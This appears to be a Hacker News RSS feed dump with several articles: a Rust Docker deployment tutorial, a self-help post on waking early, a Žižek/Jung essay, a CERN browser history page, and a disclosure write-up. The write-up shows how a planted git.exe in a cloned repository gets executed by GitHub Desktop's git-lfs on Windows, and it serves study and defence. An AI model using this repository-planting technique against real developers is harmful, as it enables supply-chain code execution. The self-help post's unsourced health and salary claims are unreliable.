<p>Pick a random book on web development or an introduction to framework XYZ.<br>
Most will not dedicate more than a paragraph to the topic of deployments.<br>
A few will have a chapter about it - usually towards the end of the book, the part you never get to actually read.<br>
A handful actually give it the space it deserves, as early as they reasonably can.</p>
<p>Why?</p>
<p>Because deployments are (still) a messy business.<br>
There are many vendors, most are not straight-forward to use and what is considered state-of-art or best-practice tends to change really quickly<sup><a href="#kubernetes-is-new">1</a></sup>.<br>
That is why most authors steer away from the topic: it takes many pages and it is painful to write something down to realise, one or two years later, that it is already out of date.</p>
<p>Nonetheless deployments are a prominent concern in the daily life of a software engineer - e.g. it is difficult to talk about database schema migrations, domain validation and API evolution without taking into account your deployment process.<br>
We simply cannot ignore the topic in a book called <em>Zero To Production</em>.</p>

<p>The purpose of this chapter is to get you to experience, first hand, what it means to <em>actually</em> deploy on every commit to your <code>main</code> branch.<br>
That is why we are talking about deployment as early as chapter five: to give you the chance to practice this muscle for the rest of the book, as you would actually be doing if this was a real commercial project.<br>
We are particularly interested, in fact, on how the engineering practice of continuous deployment influences our design choices and development habits.</p>
<p>At the same time, building the perfect continuous deployment pipeline is not the focus of the book - it deserves a book on its own, probably a whole company.<br>
We have to be pragmatic and strike a balance between intrinsic usefulness (i.e. learn a tool that is valued in the industry) and developer experience.<br>
And even if we spent the time to hack together the "best" setup, you are still likely to end up choosing different tools and different vendors due to the specific constraints of your organisation.</p>
<p>What matters is the underlying <em>philosophy</em> and getting you to try continuous deployment as a practice.</p>
<h2 id="2-1-virtualisation-docker">2.1. Virtualisation: Docker</h2>
<p>Our local development environment and our production environment serve two very different purposes.<br>
Browsers, IDEs, our music playlists - they can co-exist on our local machine. It is a multi-purpose workstation.<br>
Production environments, instead, have a much narrower focus: running our software to make it available to our users. Anything that is not strictly related to that goal is either a waste of resources, at best, or a security liability, at worst.</p>
<p>This discrepancy has historically made deployments fairly troublesome, leading to the now meme-fied complaint "It works on my machine!".<br>
It is not enough to copy the source code to our production servers.
Our software is likely to make assumptions on the capabilities exposed by the underlying operating system (e.g. a native Windows application will not run on Linux), on the availability of other software on the same machine (e.g. a certain version of the Python interpreter) or on its configuration (e.g. do I have root permissions?).<br>
Even if we started with two identical environments we would, over time, run into troubles as versions drift and subtle inconsistencies come up to haunt our nights and weekends.</p>
<p>The easiest way to ensure that our software runs correctly is to tightly control the <em>environment</em> it is being executed into.</p>
<p>This is the fundamental idea behind virtualisation technology: what if, instead of shipping code to production, you could ship a self-contained environment that included your application?!<br>
It would work great for both sides: less Friday-night surprises for you, the developer; a consistent abstraction to build on top of for those in charge of the production infrastructure.<br>
Bonus points if the environment itself can be specified as code to ensure reproducibility.</p>
<p>The nice thing about virtualisation is that it exists and it has been mainstream for almost a decade now.<br>
As for most things in technology, you have a few options to choose from depending on your needs: virtual machines, containers (e.g. <a href="https://www.docker.com/resources/what-container">Docker</a>) and a few others (e.g. <a href="https://firecracker-microvm.github.io/">Firecracker</a>).</p>
<p>We will go with the mainstream and ubiquitous option - Docker containers.</p>
<h2 id="2-2-hosting-digitalocean">2.2. Hosting: DigitalOcean</h2>
<p><a href="https://aws.amazon.com/">AWS</a>, <a href="https://cloud.google.com/">Google Cloud</a>, <a href="https://azure.microsoft.com/en-gb/">Azure</a>, <a href="https://www.digitalocean.com/">Digital Ocean</a>, <a href="https://www.clever-cloud.com/en/">Clever Cloud</a>, <a href="https://www.heroku.com/">Heroku</a>, <a href="https://www.qovery.com/">Qovery</a>...<br>
The list of vendors you can pick from to host your software goes on and on.<br>
People have made a successful business out of recommending the best cloud tailored to your specific needs and usecases - not my job (yet) or the purpose of this book.</p>
<p>We are looking for something that is easy to use (great developer experience, minimal unnecessary complexity) and fairly established.<br>
In November 2020, the intersection of those two requirements seems to be Digital Ocean, in particular their newly launched App Platform proposition.</p>

<p>DigitalOcean's App Platform has <a href="https://www.digitalocean.com/docs/app-platform/languages-frameworks/docker/">native support for deploying containerised applications</a>.<br>
This is going to be our first task: we have to write a Dockerfile to build and execute our application as a Docker container.</p>
<h2 id="3-1-dockerfiles">3.1. Dockerfiles</h2>
<p>A Dockerfile is a <em>recipe</em> for your application environment.<br>
They are organised in layers: you start from a base <em>image</em> (usually an OS enriched with a programming language toolchain) and execute a series of commands (<code>COPY</code>, <code>RUN</code>, etc.), one after the other, to build the environment you need.</p>
<p>Let's have a look at the simplest possible Dockerfile for a Rust project: </p>
<pre><code><span># We use the latest Rust stable release as base image
</span><span>FROM</span><span> rust:1.47

</span><span># Let's switch our working directory to `app` (equivalent to `cd app`)
# The `app` folder will be created for us by Docker in case it does not 
# exist already.
</span><span>WORKDIR </span><span>app
</span><span># Copy all files from our working environment to our Docker image 
</span><span>COPY</span><span> . .
</span><span># Let's build our binary!
# We'll use the release profile to make it faaaast
</span><span>RUN </span><span>cargo build --release
</span><span># When `docker run` is executed, launch the binary!
</span><span>ENTRYPOINT ["</span><span>./target/release/zero2prod</span><span>"]
</span></code></pre>
<p>Save it in a file named <code>Dockerfile</code> in the root directory of our git repository:</p>
<pre><code><span>zero2prod/
  .github/
  migrations/
  scripts/
  src/
  tests/
  .gitignore
  Cargo.lock
  Cargo.toml
  configuration.yaml
  Dockerfile
</span></code></pre>
<p>The process of executing those commands to get an image is called <em>building</em>.<br>
Using the Docker CLI:</p>
<pre><code><span># Build a docker image tagged as "zero2prod" according to the recipe
# specified in `Dockerfile`
</span><span>docker</span><span> build</span><span> --tag</span><span> zero2prod</span><span> --file</span><span> Dockerfile .
</span></code></pre>
<p>What does the <code>.</code> at the end of the command stand for?</p>
<h2 id="3-2-build-context">3.2. Build Context</h2>
<p><code>docker build</code> generates an image starting from a recipe (the Dockerfile) and a <em>build context</em>.<br>
You can picture the Docker image you are building as its own fully isolated environment.<br>
The only point of contact between the image and your local machine are commands like <code>COPY</code> or <code>ADD</code><sup><a href="#network-flag">2</a></sup>: the build context determines what files on your host machine are visible inside the Docker container to <code>COPY</code> and its friends. </p>
<p>Using <code>.</code> we are telling Docker to use the current directory as the build context for this image; <code>COPY . app</code> will therefore copy all files from the current directory (including our source code!) into the <code>app</code> directory of our Docker image.<br>
Using <code>.</code> as build context implies, for example, that Docker will not allow <code>COPY</code> to see files from the parent directory or from arbitrary paths on your machine into the image.</p>
<p>You could use a different path or even a URL (!) as build context depending on your needs.</p>
<h2 id="3-3-sqlx-offline-mode">3.3. Sqlx Offline Mode</h2>
<p>If you were eager enough, you might have already launched the build command... just to realise it doesn't work!</p>
<pre><code><span>docker</span><span> build</span><span> --tag</span><span> zero2prod</span><span> --file</span><span> Dockerfile .
</span></code></pre><pre><code><span># [...]
</span><span>Step</span><span> 4/5 : RUN cargo build</span><span> --release
</span><span># [...]
</span><span>error</span><span>: error communicating with the server: 
</span><span>Cannot</span><span> assign requested address (os error 99)
  </span><span>--</span><span>&gt; src/routes/subscriptions.rs:35:5
   |
</span><span>35 </span><span>| </span><span>/</span><span>     sqlx::query!(
36 | |         r#"</span><span>
37 | |     INSERT INTO subscriptions (id, email, name, subscribed_at)
38 | |     VALUES (</span><span>$</span><span>1</span><span>, </span><span>$</span><span>2</span><span>, </span><span>$</span><span>3</span><span>, </span><span>$</span><span>4</span><span>)
...  |
43 | |         Utc::now()
44 | |     )
   | |_____^
   |
   = note: this error originates in a macro
</span></code></pre>
<p>What is going on?<br>
<code>sqlx</code> calls into our database at compile-time to ensure that all queries can be successfully executed considering the schemas of our tables.<br>
When running <code>cargo build</code> inside our Docker image, though, <code>sqlx</code> fails to establish a connection with the …</p></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/">https://www.lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/</a></em></p>]]>
            </description>
            <link>https://www.lpalmieri.com/posts/2020-11-01-zero-to-production-5-how-to-deploy-a-rust-application/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013596</guid>
            <pubDate>Sat, 07 Nov 2020 06:57:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to wake up early as an Indie Maker]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25013594">thread link</a>) | @KlimYadrintsev
<br/>
November 6, 2020 | https://klimy.co/blog/how-to-wake-up-early | <a href="https://web.archive.org/web/*/https://klimy.co/blog/how-to-wake-up-early">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <p>I always have since I remember myself, though I was a night owl.</p>
<p>I would go to sleep after midnight, wake up as late as possible and then do the same every day while being with no energy during the day.</p>
<p>One day I read a book called “Magical Morning”, and it was the first time that I heard that:</p>
<p>There is no such thing as morning people and night owls. It just doesn’t exist. The only thing that does matter is what you tell yourself.</p>
<p>If you convince your brain that you for the life of you can not wake up early in the morning because you are not the type of person to do that. That means that you actually won’t be able to do it.</p>
<p>If you say to yourself that you can wake up and you make a plan of what to do in the morning the day before, you will wake up and have the best time possible.</p>
<p><img alt="canyon night sky" src="https://i.gyazo.com/fc73292ef84189b29586eb985b9407fd.jpg"></p>
<h2>Best time of the day</h2>
<p>I think that for me, mornings have been a highlight of the day for a while now.</p>
<p>It doesn’t matter how busy or interesting my day is. What I remember the best and when I feel the best, are mornings where I can do what is important to me and what truly matters for myself.</p>
<p>As I have said, there are important life tasks, and there are urgent life tasks. The important life tasks usually get ignored until all of the urgent tasks are done(never). This causes important tasks for important life never to get done.</p>
<p>What early mornings allow you to do is wake up, before the busy world is active so that you can focus on what is important for you personally.</p>
<p>You can finally start writing a book you have been dreaming of writing.</p>
<p>You can finally start that entrepreneurship endeavour you have wanted to start.</p>
<p>You can finally start writing and designing your blog where you can share your thoughts on the topics that matter for you.</p>
<p>You can basically do anything starting from just relaxing to actually doing productive work.</p>
<p><img alt="man looking at the sky night" src="https://i.gyazo.com/9e4f4c7b87ec3799dde4eefe11a11ce6.jpg"></p>
<h2>Prolonging life</h2>
<p>There have been some exciting findings of linking the morning routines and wake up time to the life expectancy.</p>
<ul>
<li>University of Sydney researchers released a list of six lifestyle behaviours linked to an increased risk of death.</li>
<li>Most of it involved the usual suspects: drinking, smoking, lack of exercise and too much junk food.</li>
<li>But the one factor that’s enough to make an annoying morning person even more annoying is the evidence that sleepyheads who laze in for hours are literally at risk of sleeping their life away. You snooze, you lose.</li>
</ul>
<p>Both Benjamin Franklin and Aristotle wrote books about early to bed, early to rise formula that has been implemented and used throughout the world and years.</p>
<p>I hate most of the people who wake up early. They are snobs about it, and I think the only reason they wake up at 4:30 is so that they can talk about it and impress people on how good they are and how bad people who don’t wake up early are.</p>
<p>“You got up at 4 am? Why the sleep in?” A morning person will say with a sneer — and possibly a stifled yawn.</p>
<p>People who wake up early also have the time to take charge and control their life better. Early mornings allow time for meditation, self-reflection and other activities that you can do while the world is still sleeping. All of this leads to a better and more aware life.</p>
<p>People who wake up early also usually do exercises, due to more time available before work or socialising and also drink much less. Drinking is mostly a social game of the evenings and nights, and as we don’t have the luxury of staying up until 20:00, we don’t have a reason to drink.</p>
<h2>Getting the habit down</h2>
<p>Waking up early is the same as brushing your teeth. You might want to skip it once, or you can’t be bothered, but you still do it because the way it makes you feel after and because it is the first thing you do in the mornings anyway.</p>
<p>Waking up early is just like that. Do it once or twice, and you will be on the way to doing it forever. What matters is not to underestimate the power of mornings and to pack as much to do in the mornings as possible.</p>
<p>If you are starting, you can peg your early morning rise with something nice and what you would be looking forward to the night before.</p>
<p>Give yourself in the mornings a reward. A cake would be a good idea, but probably not the best long term, but not doing anything and drinking coffee can be a great motivation boost as well as something to help you with energy if you just started.</p>
<p><img alt="coffee cup roasted" src="https://i.gyazo.com/c4961bdaf59e21d9abec7b47a2587ca6.jpg"></p>
<p>Like every habit, what matters is consistency and not magnitude at first. It would be best if you kept waking up early. You need to create a system and a good environment to keep it hassle less.</p>
<p>Do you want to finish waking up at 4:30 every morning? You are waking up at 9:00 right now? Start at waking up at 8:00 first. Please do it for 1 week, start waking up at 7:00 and so on.</p>
<p>What is important is to understand is that you are not cheating the system by sleeping less and so having long evenings and long mornings. No. What you are doing is sleeping a good amount. 7-9 hours depending on what works best for you personally. This means that you need to understand that if you want to wake up at 4:30, you need to go to sleep 20:00-22:00. You go to sleep later than that, and you will feel terribly and probably hate this system.</p>
<p>The reason for going to sleep so early is because our body is adapted to that. It gets dark around 18:00 in the winter and maybe 20:00 in Summer. That is the NATURAL time of going to bed. Waking up early is the same, you wake up naturally when the sun rises or a little before then to get ready for the day. There is no rocket science, it is just being smart and creating habits of doing it consistently.</p>
<p>If I haven’t convinced, look at this statistic:</p>
<ul>
<li>Getting things done isn’t the only perk of setting an early alarm. On average, early risers earn $45,725 a year, nearly $15,000 more per year than the average late-risers salary of $30,835. Those with 4 a.m. and 5 a.m. wake-up calls make the most ($48, 582 and $48,339 respectively), while those used to getting out of bed at noon earn the least (with an average income of $22,689).</li>
</ul>
<p>There are no coincidences in this world and so don’t try to undermine statistics and try it for yourself. You can always go back.</p>
<p>The most important thing to do to start getting up early is:</p>
<p>Start now. Get perfect later.</p>
<p><a href="https://klimy.co/">Klim Y</a></p> 
                    
                </div></div>]]>
            </description>
            <link>https://klimy.co/blog/how-to-wake-up-early</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013594</guid>
            <pubDate>Sat, 07 Nov 2020 06:57:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ŽIžek, Jung, Masking, and Autism]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25013442">thread link</a>) | @JacksonGariety
<br/>
November 6, 2020 | https://hegelsbagels.net/posts/zizek-jung-masking-autism/ | <a href="https://web.archive.org/web/*/https://hegelsbagels.net/posts/zizek-jung-masking-autism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post">

<section>
<p>In <em>The Parallax View</em>, Slavoj Žižek gives the following anecdote:</p>
<blockquote>
<p>A supreme case of such an ontological comedy occurred in December 2001 in Buenos Aires, when Argentinians took to the streets to protest against the current government, and especially against Cavallo, the economy minister. When the crowd gathered around Cavallo’s building, threatening to storm it, he escaped wearing a mask of himself (sold in disguise shops so that people could mock him by wearing his mask). It thus seems that at least Cavallo did learn something from the widespread Lacanian movement in Argentina–the fact that <em>a thing is its own best mask</em>. What one encounters in tautology (the repetition of the same) is thus pure difference–not the difference between the element and other elements, but the difference of the element from itself.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
</blockquote>
<p>This is exactly why Žižek must reject the psychology of Carl Jung. As David Roman points out in <a href="https://aussiesta.wordpress.com/2020/03/20/facemasks-carl-jung-vs-slavoj-zizek/" target="_blank">his article on facemasks</a>, Jung comes to the exact opposite conclusion:</p>
<blockquote>
<p>When we analyse the persona we strip off the mask, and discover that what seemed to be individual is at bottom collective; in other words, that the persona was only a mask of the collective psyche. Fundamentally the persona is nothing real: it is a compromise between individual and society as to what a man should appear to be. He takes a name, earns a title, exercises a function, he is this or that. In a certain sense all this is real, yet in relation to the essential individuality of the person concerned it is only a secondary reality, a compromise formation, in making which others often have a greater share than he. The persona is a semblance, a two-dimensional reality, to give it a nickname.<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a></p>
</blockquote>
<p>The thinking of this contrariety (ἐναντιότης) is, per usual, double:</p>
<ol type="1">
<li>On the one hand, Žižek is right to identify in Jung a regression to Kantianism. It is not as if the world of appearances were merely a veil that could be removed, revealing something wholly distinct from that veil. In other words, Žižek is being a good Hegelian here: essence is nothing other than its various appearances.</li>
<li>On the other hand, Žižek forgets that <em>among appearances themselves we find a spectrum of authenticity and essentiality</em>. The Hegelian—indeed, the truly philosophical—insight is that essence is the self-coincidence of appearance. In other words: there is never a face under the mask, but masks themselves differ in terms of their correspondence to themselves—that is, in terms of their internal coherence.</li>
</ol>
<p>The lesson here is that some people live their entire lives <em>as</em> a mask that has been pieced together from disjointed fragments of the collective unconscious. Their “authentic” self is an incoherent collage of ideologies that they have passively absorbed through the media. (This is, I argue, the principal danger of Facebook, Twitter, Instagram, and other “social” technologies.) Others, namely artists and philosophers, are more concerned with the question of living well, being true to themselves, and so on.</p>
<p>Žižek’s tendency to dismiss self-coincidence and truth as “new age obscurantism” runs deep into his ontology and his reading of Hegel. For Hegel, <em>Geist</em> (mind, spirit) is absolute: “There is simply no out-and-out Other for <em>Geist</em>.”<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a> For Hegel, everything is a mere moment of the self-actualization of <em>Geist</em>, though <em>Geist</em> is shot through with the contradictions that make possible, at the highest level, worldly transformation.</p>
<p>Paradoxically, we cannot simply drag Žižek over the coals in this case: his analyses of film and television already indicate that he is aware that there <em>is</em> a ‘big Other.’ (Critique of the ‘big Other’ does not amount to denial of its existence; quite the contrary!) But isn’t this an indication that Žižek is not Žižekian enough, that his reading of Hegel is too cynical, too ‘post-ideological’? Do we not find in Carl Jung, if not in Hegel himself, Žižek’s repressed other, his enantion (ἐναντίον)? That the collective unconscious is the <em>telos</em> of self-organizing nature, self-actualizing <em>Geist</em>?</p>
<p>What Žižek denies, or at least does not often enough emphasize, is that there are greater and lesser degrees of authenticity in the economy of appearances. This is precisely why, in the autistic community, the word ‘masking’ is such a pejorative term. Here we have a community of persons who are trying desperately to ‘mask,’ to become a permanent feature of the collective unconscious, and yet consistently fail to do so. Cursed by authenticity.</p>
<p>Why is this? Why is it that autistic discourse increasingly revolves around ‘masking’? Why can auties not ‘mask’ the way ‘normal’ people can? Because they <em>are</em> what Žižek often enough denies of human beings: they are “spoken by the Real, possessed by language.”<a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a></p>
<section id="references">
<h2>References</h2>
<div id="refs" role="doc-bibliography">

<p>Hegel, Georg Wilhelm Friedrich. <em>Hegel: Philosophy of Mind: A Revised Version of the Wallace and Miller Translation</em>. Translated by Arnold V. Miller and Michael Inwood, OUP Oxford, 2010.</p>
<p>Jung, C. G. <em>The Collected Works of C. G. Jung, Vol. 7: Two Essays on Analytical Psychology</em>. Translated by Gerhard Adler and R. F. C. Hull, 2nd ed. edition, Princeton University Press, 1972.</p>
<p>Žižek, Slavoj. <em>The Parallax View</em>. Reprint edition, The MIT Press, 2009.</p>
</div>
</section>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn1" role="doc-endnote"><p><span data-cites="zizek_parallax_2009">Žižek</span> 28<a href="#fnref1" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>Roman’s citation is wrong. The quote is not from <em>Four Archetypes</em> but from <em>Two Essays on Analytical Psychology</em>: <span data-cites="jung_collected_1972">Jung</span> ¶246.<a href="#fnref2" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><span data-cites="hegel_hegel_2010">Hegel</span> 3<a href="#fnref3" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p><span data-cites="bond_what_2012">Bond</span><a href="#fnref4" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
</section>
</article></div>]]>
            </description>
            <link>https://hegelsbagels.net/posts/zizek-jung-masking-autism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013442</guid>
            <pubDate>Sat, 07 Nov 2020 06:03:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Attack of the clones: Git clients remote code execution]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25013356">thread link</a>) | @infosecau
<br/>
November 6, 2020 | https://blog.blazeinfosec.com/attack-of-the-clones-github-desktop-remote-code-execution/ | <a href="https://web.archive.org/web/*/https://blog.blazeinfosec.com/attack-of-the-clones-github-desktop-remote-code-execution/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h4 id="introduction">Introduction</h4>
<p>This post is a rather unusual story of a vulnerability that could be leveraged as a supply chain attack and used to attack millions of software developers around the world. It is also a tale of a bug collision that paid a bounty to one reporter and assigned the CVE to another!</p>
<p>The main focus of this blog post is GitHub Desktop. Other Git clients such as GitKraken, Git-Tower and SourceTree were also found to be vulnerable, however these have different exploitation scenarios that require user interaction.</p>
<h4 id="briefdescriptionoftheissue">Brief description of the issue</h4>
<p>As part of GitHub Desktop's default repository cloning process, among other actions it calls the executable git-lfs.</p>
<p>From git-lfs's official page "Git Large File Storage (LFS) replaces large files such as audio samples, videos, datasets, and graphics with text pointers inside Git, while storing the file contents on a remote server like GitHub.com or GitHub Enterprise."</p>
<p>git-lfs is then called on the current cloned repository, already present in disk.</p>
<p>A vulnerability was discovered when cloning a repository with a especially crafted file in the root directory. Upon cloning such malicious repository, code execution is achieved with the same privileges as the affected user running GitHub Desktop.</p>
<p>When inspecting the desktop application under Proccess Monitor, it was noticed several actions of git-lfs called a git executable from inside the newly cloned repository.</p>
<p><img src="https://blog.blazeinfosec.com/content/images/2020/11/procmon.PNG" alt="procmon"></p>
<p>By placing a malicious git in the root of the malicious repo, a user that clones it will have the malicious git executed by git-lfs, all of this behind the scenes and transparent to the user.</p>
<p>The cloning process happens normally and there is no visual indication that a malicious binary was ran instead of the original git executable.</p>
<h4 id="rootcauseanalysis">Root cause analysis</h4>
<p>We attempted to understand the root cause of this vulnerability by reading git-lfs's code. The authors of this write-up tried to put together as much information as possible in order to understand the cause of the problem.</p>
<p>From <a href="https://github.com/git-lfs/git-lfs/blob/master/commands/command_clone.go">https://github.com/git-lfs/git-lfs/blob/master/commands/command_clone.go</a></p>
<p>From line 23:</p>
<pre><code>func cloneCommand(cmd *cobra.Command, args []string) {
	requireGitVersion()

	if git.IsGitVersionAtLeast("2.15.0") {
		msg := []string{
			"WARNING: 'git lfs clone' is deprecated and will not be updated",
			"          with new flags from 'git clone'",
			"",
			"'git clone' has been updated in upstream Git to have comparable",
			"speeds to 'git lfs clone'.",
		}

		fmt.Fprintln(os.Stderr, strings.Join(msg, "\n"))
	}
</code></pre>
<p>The function above seems to be called when a clone action takes place. Right in the beginning the function calls requireGitVersion() and then checks whether the version is at least 2.15.0.</p>
<p>From <a href="https://github.com/git-lfs/git-lfs/blob/master/commands/commands.go">https://github.com/git-lfs/git-lfs/blob/master/commands/commands.go</a></p>
<p>Line 537:</p>
<pre><code>func requireGitVersion() {
	minimumGit := "1.8.2"

	if !git.IsGitVersionAtLeast(minimumGit) {
		gitver, err := git.Version()
		if err != nil {
			Exit("Error getting git version: %s", err)
		}
		Exit("git version &gt;= %s is required for Git LFS, your version: %s", minimumGit, gitver)
	}
}
</code></pre>
<p>It calls !git.IsGitVersionAtLeast(minimumGit) which can be found in <a href="https://github.com/git-lfs/git-lfs/blob/master/git/version.go">https://github.com/git-lfs/git-lfs/blob/master/git/version.go</a></p>
<p>From line 28:</p>
<pre><code>func IsGitVersionAtLeast(ver string) bool {
	gitver, err := Version()
	if err != nil {
		tracerx.Printf("Error getting git version: %v", err)
		return false
	}
	return IsVersionAtLeast(gitver, ver)
}
</code></pre>
<p>Version() can be found in the same file version.go on line 18:</p>
<pre><code>func Version() (string, error) {
	gitVersionOnce.Do(func() {
		gitVersion, gitVersionErr =
			subprocess.SimpleExec("git", "version")
	})
	return gitVersion, gitVersionErr
}
</code></pre>
<p>The function calling chain is the following:<br>
cloneCommand() -&gt; requireGitVersion() -&gt; IsGitVersionAtLeast() -&gt; Version()</p>
<p>We can see that in line 21 in version.go, there is inside the function Version() a call to subprocess.SimpleExec() - it executes the git binary with the argument "version".</p>
<p>There is an implicit assumption from git-lfs that by executing an external binary, the operating system will first look it up from the system's PATH environment variable. This is the true root cause of the vulnerability.</p>
<p>Calling the subprocess 'git' works as intended in GitHub Desktop for MacOS. In Windows, however, the search order favors the current directory first and only then it searches in the order specified in PATH.</p>
<h4 id="exploitation">Exploitation</h4>
<p>By copying calc.exe, renaming it to git.exe and committing/pushing it into the root of the repository, the attacker sets up the crafted repository that will be used to later exploit users.</p>
<p>When a developer clones this repository using GitHub Desktop for Windows, its subcomponent git-lfs will work on the cloned folder as its current directory, meaning all subsequent calls to the binary 'git' will be instead calling the malicious git.exe not the one present in the PATH.</p>
<p><img src="https://blog.blazeinfosec.com/content/images/2020/11/github-version-2.PNG" alt="github-version-2"></p>
<p><img src="https://blog.blazeinfosec.com/content/images/2020/11/github-where-git-is-1.PNG" alt="github-where-git-is-1"></p>
<p><img src="https://blog.blazeinfosec.com/content/images/2020/11/cloning1-1.PNG" alt="cloning1-1"></p>
<p><img src="https://blog.blazeinfosec.com/content/images/2020/11/cloning2-1.PNG" alt="cloning2-1"></p>
<p><img src="https://blog.blazeinfosec.com/content/images/2020/11/pwned.PNG" alt="pwned"></p>
<p>Below is a the video of exploiting this issue on GitHub Desktop for Windows:</p>
<iframe width="700" height="500" src="https://www.youtube.com/embed/p8tbHNBbO1U" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<h4 id="otherclients">Other clients</h4>
<p>During our research we noticed SourceTree</p>
<ul>
<li>SourceTree</li>
</ul>
<iframe width="700" height="500" src="https://www.youtube.com/embed/zOXUdP50VYM" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<ul>
<li>GitKraken</li>
</ul>
<iframe width="700" height="500" src="https://www.youtube.com/embed/RmLCjgc0ppo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<h4 id="credits">Credits</h4>
<p>The vulnerability was simultaneously discovered and researched by <a href="https://twitter.com/Rapt00rVF">Vitor Fernandes</a> and Julio Fort of Blaze Information Security. The independent researcher Dawid Golunski (dobra robota, amigo!) apparently discovered the issue a few days earlier and submitted it to MITRE, while Vitor submitted it to GitHub's bug bounty.</p>
<p>Vitor collected the bounty from GitHub's program on HackerOne as his report arrived earlier and Dawid was assigned the CVE.</p>
<h4 id="references">References</h4>
<p>[1] <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/path">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/path</a>]<br>
[2] <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753427(v=ws.11)">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753427(v=ws.11)</a><br>
[3] <a href="https://github.com/git-lfs/git-lfs/security/advisories/GHSA-4g4p-42wc-9f3m">https://github.com/git-lfs/git-lfs/security/advisories/GHSA-4g4p-42wc-9f3m</a> (Collision with Dawid Golunski)</p>
</div></div>]]>
            </description>
            <link>https://blog.blazeinfosec.com/attack-of-the-clones-github-desktop-remote-code-execution/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013356</guid>
            <pubDate>Sat, 07 Nov 2020 05:18:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[China’s Social Credit System Explained [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25013331">thread link</a>) | @jjb123
<br/>
November 6, 2020 | https://www.bertelsmann-stiftung.de/fileadmin/files/aam/Asia-Book_A_03_China_Social_Credit_System.pdf | <a href="https://web.archive.org/web/*/https://www.bertelsmann-stiftung.de/fileadmin/files/aam/Asia-Book_A_03_China_Social_Credit_System.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.bertelsmann-stiftung.de/fileadmin/files/aam/Asia-Book_A_03_China_Social_Credit_System.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013331</guid>
            <pubDate>Sat, 07 Nov 2020 05:10:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Browser – WorldWideWeb Next Application]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25013103">thread link</a>) | @mpweiher
<br/>
November 6, 2020 | https://worldwideweb.cern.ch/worldwideweb/ | <a href="https://web.archive.org/web/*/https://worldwideweb.cern.ch/worldwideweb/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    
<section>
	<h2>WorldWideWeb</h2>
	<div>
		<p>The idea of hypertext preceded the World Wide Web by decades. But nearly all hypertext systems worked on local files. Tim Berners-Lee wanted to create a system that would work across networks so that people could link from a file on one machine to another file on another machine.</p>
		<p>WorldWideWeb wasn't just a programme for browsing files. It was a browser and editor. The introductory text reads:</p>
		<blockquote>HyperMedia Browser/Editor, An excercise in global information availability by Tim Berners-Lee</blockquote>
		<p>Today it's hard to imagine that web browsers might also be used to create web pages. It turned out that people were quite happy to write HTML by hand—something that Tim Berners-Lee and colleagues never expected. They thought that some kind of user interface would be needed for making web pages and links. That's what the WorldWideWeb browser provided. You could open a document in one window and "mark" it. Then, in a document in another window, you could create a link to the marked page.</p>
		<p>You'll notice as you use the WorldWideWeb browser that you need to double-click links to open them. That's because a single click was used for editing.</p>
	</div>
</section>

<section>
	<h2>Browsing</h2>
	<div>
		<p>The user interface of the WorldWideWeb browser somewhat blurred the lines between documents on your own computer and documents out on the network. To "browse" directly to a document out on the network, you need to know its URL. But you can't simply type that URL into an address bar; there is no address bar. Instead you have to follow a sequence of steps:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "Document".</li>
			<li>Now from the newly-opened "Document" menu, select "Open from full document reference".</li>
			<li>Type the URL into the field marked "reference".</li>
			<li>Press the "Open" button</li>
		</ol>
		<p>Once you've got a web-based document (or web page, as we would say today) open in WorldWideWeb, you can navigate by double-clicking on links. Every link you double-click will open in a new window.</p>
	</div>
